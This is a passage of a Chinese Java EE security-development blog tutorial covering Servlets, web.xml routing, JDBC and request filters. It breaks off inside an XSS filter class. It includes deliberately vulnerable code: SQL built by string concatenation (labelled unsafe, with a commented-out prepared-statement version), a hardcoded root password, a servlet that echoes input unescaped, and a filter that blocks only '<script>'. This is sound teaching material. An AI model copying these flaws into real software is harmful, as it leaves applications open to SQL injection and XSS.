<!DOCTYPE html>
<html lang="en">
    <head>
        
    
    <link rel='stylesheet' href="/./css/dracula.css">

        <title>安全开发-JavaEE</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
<link rel="stylesheet" href="/css/style.css">
<link rel="shortcut icon" href="/favicon.ico">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="manifest" href="/site.webmanifest">

    <meta name="generator" content="Hexo 6.3.0"></head>
    <body>
        <header class="al_header al_pos_fixed">
    <div class="al_header_container dis_flex_jcenter">
        <div class="al_header_container_left">
            <div class="al_header_site_title">
                <a href="/">Hexo</a>
            </div>
        </div>

        <div class="dis_flex_jcenter">
            <div class="al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
                </svg>
            </div>
        </div>
    </div>
</header>

        <div class="al_sidebar">

    <div class="al_sidebar_overlay al_full_cover"></div>

    <div class="al_pos_fixed al_sidebar_cnt">
        <div class="dis_flex_acenter al_sidebar_header">
            <h3>Hexo</h3>
            <div class="al_sidebar_close al_header_setting">
                <svg class="al_header_icon">
                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
                </svg>
            </div>
        </div>

        <div class="al_sidebar_author_cnt">

            <div class="al_sidebar_author_info">
                <h4>John Doe</h4>
                <img class="al_sidebar_avatar" src="https://yourAvatorURL">
                <p></p>
            </div>

            
        </div>
    </div>
</div>

        
    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
        <img class="al_lightbox_img"/>
    </div>
    <div class="al_page_background dis_flex_center al_full_cover"></div>
    <div class="al_page_container">
        <div class="al_pos_ab al_fake_background"></div>
        <div class="al_main_container al_shadow al_main_page_container">
            <article class="al_article">
                <header>
                    <h1 class="al_page_title">
                        安全开发-JavaEE
                    </h1>
                    <div class="al_page_info dis_flex">
                        <div class="al_page_content_info">
                            Sun August 13, 2023 08:44 AM
                        </div>

                        

                        
                        <span class="tags"></span>
                    </div>
                </header>

                
                    <div class="al_page_content_outline">
                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="toc-text">开发环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E9%A1%B9%E7%9B%AE%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-text">Java项目的结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Servlet"><span class="toc-text">Servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%92%8C%E4%BD%BF%E7%94%A8Servlet"><span class="toc-text">创建和使用Servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IndexServlet"><span class="toc-text">IndexServlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-xml"><span class="toc-text">web.xml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">Servlet的生命周期</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8JDBC%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">用JDBC操作数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-text">开发流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyselectServlet"><span class="toc-text">MyselectServlet</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filter"><span class="toc-text">Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4XSS"><span class="toc-text">过滤XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TestServlet"><span class="toc-text">TestServlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XssFilter"><span class="toc-text">XssFilter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E9%AA%8C%E8%AF%81"><span class="toc-text">cookie验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AdminServlet"><span class="toc-text">AdminServlet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AdminFilter"><span class="toc-text">AdminFilter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Listen"><span class="toc-text">Listen</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%ACsession%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%94%80%E6%AF%81"><span class="toc-text">监听session的创建和销毁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSession"><span class="toc-text">CSession</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DSession"><span class="toc-text">DSession</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ListenSession"><span class="toc-text">ListenSession</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="toc-text">反射机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-3"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-java"><span class="toc-text">User.java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Class%E5%AF%B9%E8%B1%A1%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-text">Class对象类获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Field%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-text">Field成员变量类获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Constructor%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-text">Constructor构造方法类获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Method%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-text">Method成员方法类获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%BA%94%E7%94%A8"><span class="toc-text">反射应用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-4"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E4%BD%BF%E7%94%A8"><span class="toc-text">原生使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UserDemo"><span class="toc-text">UserDemo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SerializableDemo"><span class="toc-text">SerializableDemo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95"><span class="toc-text">重写方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UserDemo-1"><span class="toc-text">UserDemo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SerializableDemo-1"><span class="toc-text">SerializableDemo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UnserializableDemo"><span class="toc-text">UnserializableDemo</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95"><span class="toc-text">断点调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%96%B9%E6%B3%95"><span class="toc-text">触发方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UserDemo-2"><span class="toc-text">UserDemo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SerializableDemo-2"><span class="toc-text">SerializableDemo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UnserializableDemo-1"><span class="toc-text">UnserializableDemo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%8E%A7%E5%85%B6%E4%BB%96%E7%B1%BB%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95"><span class="toc-text">可控其他类重写方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UrlDns"><span class="toc-text">UrlDns</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li></ol></li></ol></li></ol></li></ol>
                    </div>
                

                
                <section id="post-body">
                    <h1 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h1><p>idea+Navicat Premium</p>
<p>idea：写java代码</p>
<p>Navicat Premium：数据库</p>
<h1 id="Java项目的结构"><a href="#Java项目的结构" class="headerlink" title="Java项目的结构"></a>Java项目的结构</h1><p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/1-1691843624182-2.png" alt="1"></p>
<p>写程序一般会用到的：</p>
<p>lib目录来存第三方jar文件，src&#x2F;main&#x2F;java下是java代码，webapp&#x2F;web-inf&#x2F;web.xml是配置web，比如路由的地方。</p>
<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><p>Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了web开发的相关内容以及servlet相关内容的配置使用,是JAVAEE开发的重中之重。</p>
<h2 id="创建和使用Servlet"><a href="#创建和使用Servlet" class="headerlink" title="创建和使用Servlet"></a>创建和使用Servlet</h2><h3 id="IndexServlet"><a href="#IndexServlet" class="headerlink" title="IndexServlet"></a>IndexServlet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">package com.example.servletdemo;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.SQLException;  //引入库</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/index&quot;)  //路由，这里和web.xml里作用一样，二选一即可</span><br><span class="line">public class IndexServlet extends HttpServlet &#123; //创建一个类继承HttpServlet</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;  //在有get请求的时候触发此函数</span><br><span class="line">        System.out.println(&quot;--------------doGet&quot;);  //终端输出doGET</span><br><span class="line">        String id =req.getParameter(&quot;id&quot;); //get请求接收到参数id</span><br><span class="line">        resp.setContentType(&quot;GBK&quot;);  //输出的编码</span><br><span class="line">        resp.setContentType(&quot;text/html&quot;); //输出的格式</span><br><span class="line">        PrintWriter out = resp.getWriter();   //从HttpServletResponse中get一个PrintWriter,取一个响应客户端的流对象，打个通俗的比方就是通过HttpServletResponse对象得到一支笔，然后就可以用out.print()方法在网页上写任何你想显示的内容。</span><br><span class="line">        out.println(&quot;这是GET请求的数据:&quot;); //输出到浏览器中</span><br><span class="line">        out.println(&quot;id：&quot;+id+&quot;&lt;br&gt;&quot;);</span><br><span class="line">        out.flush(); //刷新</span><br><span class="line">        out.close(); //关闭</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        String name = req.getParameter(&quot;name&quot;);</span><br><span class="line">        resp.setContentType(&quot;utf-8&quot;);</span><br><span class="line">        resp.setContentType(&quot;text/html&quot;);</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(&quot;这是post提交的数据&quot;);</span><br><span class="line">        out.println(name);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        System.out.println(&quot;--------------doPost&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig config) throws ServletException&#123;</span><br><span class="line">        System.out.println(&quot;--------------init&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        System.out.println(&quot;--------------destroy&quot;);</span><br><span class="line">        super.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;--------------http service&quot;);</span><br><span class="line">        super.service(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;--------------Servlet service&quot;);</span><br><span class="line">        super.service(req, res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>这个和IndexServlet的@WebServlet(“&#x2F;index”) 二选一</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;  //以上是自带的</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">      &lt;servlet-name&gt;index&lt;/servlet-name&gt;  //取名为index</span><br><span class="line">      &lt;servlet-class&gt;com.example.servletdemo.IndexServlet&lt;/servlet-class&gt;  //项目地址，在IndexServlet复制来的</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;index&lt;/servlet-name&gt;  //上面取的那个名字</span><br><span class="line">        &lt;url-pattern&gt;/index&lt;/url-pattern&gt;  //路由</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Servlet的生命周期"><a href="#Servlet的生命周期" class="headerlink" title="Servlet的生命周期"></a>Servlet的生命周期</h3><p>用get运行以上代码，发现结果输出顺序是init，http service，Servlet service，doGet，再次get访问输出是http service，Servlet service，doGet，结束运行后输出destroy。可得：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/2.png" alt="2"></p>
<h1 id="用JDBC操作数据库"><a href="#用JDBC操作数据库" class="headerlink" title="用JDBC操作数据库"></a>用JDBC操作数据库</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范.数据库驱动: 由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用！</p>
<p>1、下载jar</p>
<p><a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a></p>
<p>2、引用封装jar</p>
<p>创建lib目录，复制导入后，添加为库</p>
<p>3、注册数据库驱动</p>
<p>Class.forName(“com.mysql.jdbc.Driver”);</p>
<p>4、建立数据库连接</p>
<p>String url &#x3D;”jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;demo01”;</p>
<p>Connection connection&#x3D;DriverManager.getConnection(url,”x”,”x”);</p>
<p>5、创建Statement执行SQL</p>
<p>Statement statement&#x3D; connection.createStatement();</p>
<p>ResultSet resultSet &#x3D; statement.executeQuery(sql);</p>
<p>6、结果ResultSet进行提取</p>
<p>while (resultSet.next()){</p>
<p>​    int id &#x3D; resultSet.getInt(“id”);</p>
<p>​    String page_title &#x3D; resultSet.getString(“page_title”);</p>
<p>​    …….</p>
<p>}</p>
<h2 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h2><p>把下载的jar放到lib里，右键执行下</p>
<h2 id="MyselectServlet"><a href="#MyselectServlet" class="headerlink" title="MyselectServlet"></a>MyselectServlet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo02;</span><br><span class="line"></span><br><span class="line">import java.sql.*;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class NewsServlet &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;</span><br><span class="line"></span><br><span class="line">        //接受用户输入的 变量字符串s接受</span><br><span class="line">        Scanner scanner=new Scanner(System.in);</span><br><span class="line">        System.out.print(&quot;pelease input id:&quot;);</span><br><span class="line">        String s=scanner.nextLine();</span><br><span class="line">        System.out.println(s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class.forName(&quot;com.mysql.jdbc.Driver&quot;); //注册数据库驱动</span><br><span class="line">        String url =&quot;jdbc:mysql://localhost:3306/dome01&quot;;</span><br><span class="line">        Connection connection = DriverManager.getConnection(url,&quot;root&quot;,&quot;123456&quot;);</span><br><span class="line">        System.out.println(connection); //连接数据库</span><br><span class="line"></span><br><span class="line">        //不安全的写法</span><br><span class="line">      String sql=&quot;select * from new where id=&quot;+s; //sql语句</span><br><span class="line">      System.out.println(sql); //输出sql语句</span><br><span class="line">      Statement statement= connection.createStatement(); </span><br><span class="line">      ResultSet resultSet = statement.executeQuery(sql); //执行</span><br><span class="line"></span><br><span class="line">        //预编译写法</span><br><span class="line">       /* String safesql=&quot;select * from news where id=?&quot;;</span><br><span class="line">        PreparedStatement preparedStatement=connection.prepareStatement(safesql); //预编译</span><br><span class="line">        preparedStatement.setString(1,s);</span><br><span class="line">        ResultSet resultSet=preparedStatement.executeQuery(); //执行sql语句</span><br><span class="line">        System.out.println(safesql);*/</span><br><span class="line"></span><br><span class="line">        while (resultSet.next())&#123; 结果遍历赋值输出</span><br><span class="line">            int id = resultSet.getInt(&quot;id&quot;);</span><br><span class="line">            String page_title = resultSet.getString(&quot;page_title&quot;);</span><br><span class="line">            String heading = resultSet.getString(&quot;heading&quot;);</span><br><span class="line">            String subheading = resultSet.getString(&quot;subheading&quot;);</span><br><span class="line">            String content = resultSet.getString(&quot;content&quot;);</span><br><span class="line">            String img = resultSet.getString(&quot;img&quot;);</span><br><span class="line">            System.out.println(id+&quot;|&quot;+page_title+&quot;|&quot;+heading+&quot;|&quot;+subheading+&quot;|&quot;+content+&quot;|&quot;+img);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/4.png" alt="4"></p>
<h1 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p>
<h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><p>1、创建过滤器</p>
<p>2、过滤器内置方法</p>
<p>init doFilter destroy</p>
<p><img src="/2023/08/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE/5.png" alt="5"></p>
<h2 id="过滤XSS"><a href="#过滤XSS" class="headerlink" title="过滤XSS"></a>过滤XSS</h2><h3 id="TestServlet"><a href="#TestServlet" class="headerlink" title="TestServlet"></a>TestServlet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package com.example.filterdemo1.servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;  </span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/test&quot;)</span><br><span class="line">public class  TestServlet extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        String code =req.getParameter(&quot;code&quot;); //接收参数</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(code);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XssFilter"><a href="#XssFilter" class="headerlink" title="XssFilter"></a>XssFilter</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package com.example.filterdemo1.filter;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebFilter(&quot;/test&quot;)</span><br><span class="line">public class XssFilter implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    //中间件启动后就自动运行</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        System.out.println(&quot;xss开启过滤&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    //中间件关闭后就自动运行</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        System.out.println(&quot;xss销毁过滤&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    //doFilter 访问路由触发的方法</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        System.out.println(&quot;xss正在过滤&quot;);</span><br><span class="line">        //过滤代码就应该在放行前</span><br><span class="line">        //如果符合就放行，不符合就过滤（拦截）</span><br><span class="line">        //XSS过滤 接受参数值 如果有攻击payload 就进行拦截</span><br><span class="line">        // 接受参数值 如果没有攻击payload 就进行放行</span><br><span class="line">        HttpServletRequest request= (HttpServletRequest) servletRequest; //HttpServletRequest比ServletRequest多了一些针对于Http协议的方法。当需要使用一些Http协议方法时，需通过ServletRequest创建HttpServletRequest对象</span><br><span class="line">        String code = request.getParameter(&quot;code&quot;);</span><br><span class="line">        if(!code.contains(&quot;&lt;script&gt;&quot;))&#123; //没有攻击payload           filterChain.doFilter(servletRequest,servletResponse); //放行</span><br><span 